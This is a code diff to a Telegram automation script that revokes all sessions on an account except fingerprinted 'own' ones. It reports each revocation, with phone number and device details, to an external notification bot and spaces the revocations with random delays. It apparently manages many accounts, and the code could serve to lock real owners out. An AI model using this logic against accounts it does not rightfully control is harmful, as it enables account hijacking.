@@ -33,21 +33,36 @@ async function removeOtherAuths(ctx) {
     if (!ctx.client)
         throw new Error('Client is not initialized');
     const result = await ctx.client.invoke(new telegram_1.Api.account.GetAuthorizations());
+    const authSummary = result.authorizations.map(formatAuthForLog);
     let keptCount = 0;
     let revokedCount = 0;
+    let failedCount = 0;
+    const failedAuths = [];
+    ctx.logger.info(ctx.phoneNumber, `Auth cleanup starting: total=${result.authorizations.length}`, authSummary);
     for (const auth of result.authorizations) {
         if (isOwnAuth(ctx.phoneNumber, auth)) {
             keptCount++;
-            ctx.logger.info(ctx.phoneNumber, `Keeping auth: ${auth.appName} | ${auth.deviceModel} | current=${auth.current}`);
+            const protectionReason = auth.current
+                ? 'current'
+                : (0, tg_config_1.getAuthProtectionReason)(auth) || 'fingerprint_match';
+            ctx.logger.info(ctx.phoneNumber, `Keeping protected auth (${protectionReason}): ${auth.appName} | ${auth.deviceModel} | current=${auth.current}`);
             continue;
         }
         ctx.logger.info(ctx.phoneNumber, `Revoking auth: ${auth.appName} | ${auth.deviceModel} | ${auth.country}`);
         await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Removing Auth\n\nMobile: ${ctx.phoneNumber}\nApp: ${auth.appName || 'unknown'}\nDevice: ${auth.deviceModel || 'unknown'}\nCountry: ${auth.country || 'unknown'}\nAPI ID: ${auth.apiId || 'unknown'}`)}`);
-        await resetAuthorization(ctx, auth);
-        revokedCount++;
+        const revoked = await resetAuthorization(ctx, auth);
+        if (revoked) {
+            revokedCount++;
+        }
+        else {
+            failedCount++;
+            failedAuths.push(formatAuthForLog(auth));
+        }
         await (0, Helpers_1.sleep)(2000 + Math.random() * 3000);
     }
-    ctx.logger.info(ctx.phoneNumber, `Auth cleanup: kept ${keptCount}, revoked ${revokedCount}`);
+    ctx.logger.info(ctx.phoneNumber, `Auth cleanup attempted: kept=${keptCount}, revoked=${revokedCount}, failed=${failedCount}`, {
+        failedAuths,
+    });
     try {
         const me = await ctx.client.getMe();
         if (!me) {
@@ -59,13 +74,34 @@ async function removeOtherAuths(ctx) {
         ctx.logger.error(ctx.phoneNumber, 'CRITICAL: Our session may have been revoked during removeOtherAuths!', verifyError);
         throw new Error(`Session self-check failed after removeOtherAuths: ${verifyError}`);
     }
+    const afterResult = await ctx.client.invoke(new telegram_1.Api.account.GetAuthorizations());
+    const remainingOtherAuths = afterResult.authorizations.filter((auth) => !isOwnAuth(ctx.phoneNumber, auth));
+    ctx.logger.info(ctx.phoneNumber, `Auth cleanup verified: total=${afterResult.authorizations.length}, remainingOther=${remainingOtherAuths.length}`, {
+        authorizations: afterResult.authorizations.map(formatAuthForLog),
+    });
+    if (failedCount > 0 || remainingOtherAuths.length > 0) {
+        throw new Error(`removeOtherAuths incomplete: failed=${failedCount}, remainingOther=${remainingOtherAuths.length}, remaining=${remainingOtherAuths.map(formatAuthForLog).join('; ')}`);
+    }
+}
+function formatAuthForLog(auth) {
+    return [
+        `app=${auth.appName || 'unknown'}`,
+        `device=${auth.deviceModel || 'unknown'}`,
+        `country=${auth.country || 'unknown'}`,
+        `current=${Boolean(auth.current)}`,
+        `apiId=${auth.apiId || 'unknown'}`,
+        `hash=${auth.hash?.toString?.() || 'unknown'}`,
+    ].join(' | ');
 }
 async function resetAuthorization(ctx, auth) {
     try {
         await ctx.client?.invoke(new telegram_1.Api.account.ResetAuthorization({ hash: auth.hash }));
+        return true;
     }
     catch (error) {
         (0, parseError_1.parseError)(error, `Failed to reset authorization for ${ctx.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel} `);
+        ctx.logger.error(ctx.phoneNumber, `Failed to revoke auth: ${formatAuthForLog(auth)}`, error);
+        return false;
     }
 }
 async function getAuths(ctx) {
